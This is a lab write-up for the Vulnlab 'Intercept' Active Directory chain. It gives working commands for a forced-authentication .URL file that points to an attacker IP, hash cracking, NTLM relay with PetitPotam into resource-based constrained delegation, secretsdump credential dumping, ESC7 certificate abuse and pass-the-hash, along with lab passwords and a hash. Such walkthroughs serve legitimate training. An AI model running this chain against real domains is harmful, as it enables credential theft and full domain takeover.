---
title: Vulnlab Chain - Intercept
date: 2024-02-19
categories: [vulnlab]
tags: [AD]
pin: false
---

## Vulnlab Chain - Intercept
Intercept is a hard rated chain which contains two machines WS01 and DC01. The chain starts with forced authentication using a file upload to grab a users hash. Using this used we performed the Resourced Based Contrained Delegation (RBCD) WebClient attack to escalate privileges. Finally using ESC7 we elevate privileges to Domain Admin.

![_install](/assets/img/VL-Intercept/intercept_slide.png)

## Initial Access
Added the following to the /etc/hosts file:
```bash
10.10.185.69 intercept.vl
10.10.185.69 DC01.intercept.vl
10.10.185.70 WS01.intercept.vl
```

I started off using some nmap scans and quickly noticed  that it was possible to access the dev share using a null session.

![_install](/assets/img/VL-Intercept/null_session_dev.png)

I entered the share using null authentication and looked through the directories.

![_install](/assets/img/VL-Intercept/null_session_dev_2.png)

I noticed that the "readme.txt" file says that the share is checked regulary for updates for the application. This for me was a big indicator for forced authenticated using a file upload. I created a malcious .URL file:
```bash
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\10.8.0.49\%USERNAME%.icon
IconIndex=1
```
And uploaded it to the share using an smbclient session:

![_install](/assets/img/VL-Intercept/file_upload.png)

Next up is setting up responder with a SMB listener to get the NTLMv2 hash of the Kathryn.Spencer Domain User:

![_install](/assets/img/VL-Intercept/responder.png)

We can't relay the connection to the Domain Controller before SMB Signing is enabled by default. However I always check this to make sure.

![_install](/assets/img/VL-Intercept/signing_enabled.png)

So instead of relaying the connection lets try to check it using hashcat. I put the contents of the hash in a file called hash.txt and ran it against rockyout.txt like so:
```bash
hashcat -a 0 -m 5600 hash.txt /opt/rockyou.txt
```
This succesfully recovered the password which ended up being "Choclate1". 
![_install](/assets/img/VL-Intercept/cracked_hash.png)

## Domain Enumeration
Now that we have a valid Domain user we can enumerate the domain using bloodhound. Let's run the python remote ingestor to collect some data:
```bash
bloodhound.py -d intercept.vl -v --zip -c All -dc DC01.intercept.vl -ns 10.10.185.69 -u 'Kathryn.spencer' -p 'Chocolate1' --dns-timeout 10
```
![_install](/assets/img/VL-Intercept/bloodhound.png)

The user kathryn.spencer doesn't have any interesting outbound permissions.
![_install](/assets/img/VL-Intercept/bloodhound_enum.png)

I enumerated the Domain more and figured out that the MachineAccountQuota has the default setting of "10".
![_install](/assets/img/VL-Intercept/maq.png)

And also figured out that the Domain Controller doesn't have LDAP Signing enforced:
![_install](/assets/img/VL-Intercept/ldap_signing.png)

If the WebDAV service is also enabled we can perform an RBCD WebClient attack using coerced authentication such as PetitPotam. Lets check if the WebDAV service is active using netexec:
![_install](/assets/img/VL-Intercept/webdav_client.png)

## RBCD to Local Administrator
Now that we know that the WebDAV service is enabled on WS01, LDAP Signing is disabled on the DC and we can add machine accounts to the domain we can abuse this in combination with coerced authentcation to escalate privileges. However when relaying out coercion authentication and add RBCD permissions to WS01 the authenticated connection has to come from a trusted intranet zone. Luckly for us by default the "Authenticated Users" group can create child objects on the ADIDNS zone. Lets start off the attack by create a new A-record which points to our machine using dnstool.py:
```bash
dnstool.py -u 'intercept\kathryn.spencer' -p 'Chocolate1' -a add -r kali -d 10.8.0.49 10.10.185.69
```
![_install](/assets/img/VL-Intercept/dnstool.png)
Next is starting ntlmrelayx for relaying the coerced authentication:
```bash
ntlmrelayx.py -t ldaps://10.10.185.69 --delegate-access --http-port 8080 -smb2support
```
![_install](/assets/img/VL-Intercept/ntlmrelayx.png)
Finishing off we coerce authenticated using PetitPotam to our created DNS record which is in trusted intranet zone which gets relayed to the Domain Controller to allow impersonation on WS01$ via S4U2Proxy. We can trigger the coercion using:
```bash
petitpotam.py -d "intercept.vl" -u "kathryn.spencer" -p "Chocolate1" kali@8080/a 10.10.185.70
```
![_install](/assets/img/VL-Intercept/petitpotam.png)

And if we now take a look at ntlmrelayx we see that a new computer has been created which allows us the impersonate users via S4U2Proxy:
![_install](/assets/img/VL-Intercept/relay_ok.png)

Next we request a TGT for the CIFS service as the Administrator on the WS01 computer using getST.py:
```bash
getST.py -spn cifs/WS01.intercept.vl -dc-ip 10.10.185.69 -impersonate administrator intercept.vl/PMZKVLGA$:'.Wpkn,gC7Xpd}9S'
```
![_install](/assets/img/VL-Intercept/TGT.png)

Now we export the TGT in memory and run secretsdump.py to obtains logon information.
```bash
export KRB5CCNAME=administrator@cifs_WS01.intercept.vl@INTERCEPT.VL.ccache 
secretsdump.py administrator@WS01.intercept.vl -k -no-pass
```
![_install](/assets/img/VL-Intercept/secretsdump1.png)
This reveals the password of the user Simon_Bowen. Lets check bloodhound if this user have any interesting permissions which we can abuse. Lookup at the output we can see that the user is member of the helpdesk groups which has GenericAll permissons on the ca-managers group. 

![_install](/assets/img/VL-Intercept/perms1.png)

Now lets run certipy to find if this group have any intersting permissions:
```bash
certipy find -username Simon.Bowen@intercept.vl -password 'b0OI_fHO859+Aw' -dc-ip 10.10.185.69
```
Looking at the output we see that the ca-managers group has ManageCa permission on the Certificate Authority which makes it vulnerable to ESC7
![_install](/assets/img/VL-Intercept/esc7.png)

## AD CS Misconfiguration (ESC7)
To be able to abuse ESC7 we first need to add Simon.Bowen to the ca-managers group. This is possible because the group that he is part of (helpdesk) has GenericAll permissions on the group. We can add Simon to the group using net rpc:
```bash
net rpc group addmem 'ca-managers' 'Simon.Bowen' -U intercept.vl/Simon.Bowen -S DC01.intercept.vl 
```
To verify the user has been succesfully added to the group I re-ran bloodhound a confirmed Simon.Bowen is now part of the ca-managers group:
![_install](/assets/img/VL-Intercept/perms2.png)

Now that we have suffient permissions we can perform the ESC7 attack on the AD CS. First I added myself the Managed Certificated accces right by adding myself as a new officer:
```bash
 certipy ca -u Simon.Bowen -p 'b0OI_fHO859+Aw' -dc-ip 10.10.183.85 -ca intercept-DC01-CA -add-officer simon.bowen
```
![_install](/assets/img/VL-Intercept/esc7-p1.png)
Now we check if the SubCA template can be enabled on the CA using the -enable-template parameter. By default the SubCA template is enabled.
```bash
certipy ca -u Simon.Bowen -p 'b0OI_fHO859+Aw' -dc-ip 10.10.185.69 -ca intercept-DC01-CA -list-template
```
![_install](/assets/img/VL-Intercept/esc7-p2.png)
Now that we have all the prerequisites for this attack we can start by request a certificate based on the SubCA template. This request will be benied but we will save the private key and note down the request ID:
```bash
certipy req -u Simon.Bowen -p 'b0OI_fHO859+Aw' -dc-ip 10.10.185.69 -ca intercept-DC01-CA -template 'SubCA' -upn administrator@intercept.vl -target intercept.vl
```
![_install](/assets/img/VL-Intercept/esc7-p3.png)

Having the manage certificate rights we can validate the failed request since we have the key:
```bash
certipy ca -u Simon.Bowen -p 'b0OI_fHO859+Aw' -dc-ip 10.10.185.69 -ca 'intercept-DC01-CA' -issue-request 5
```
![_install](/assets/img/VL-Intercept/esc7-p4.png)
Now that we certificate is issued we can retrieve the administrator's certificate:
```bash
certipy req -u Simon.Bowen -p 'b0OI_fHO859+Aw' -dc-ip 10.10.185.69 -ca 'intercept-DC01-CA' -target intercept.vl -retrieve 5
```
![_install](/assets/img/VL-Intercept/esc7-p5.png)

Now that we have a certificate of the administrator we can use it to authenticate and retrieve the NT hash:
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.185.69 -domain intercept.vl -username administrator
```
![_install](/assets/img/VL-Intercept/esc7-p6.png)

We can use this hash to gain access the the DC using netexec:
```
nxc smb DC01.intercept.vl -u Administrator -H ad95c338a6cc5729ae7390acbe0ca91f -x whoami
```
![_install](/assets/img/VL-Intercept/da_access.png)











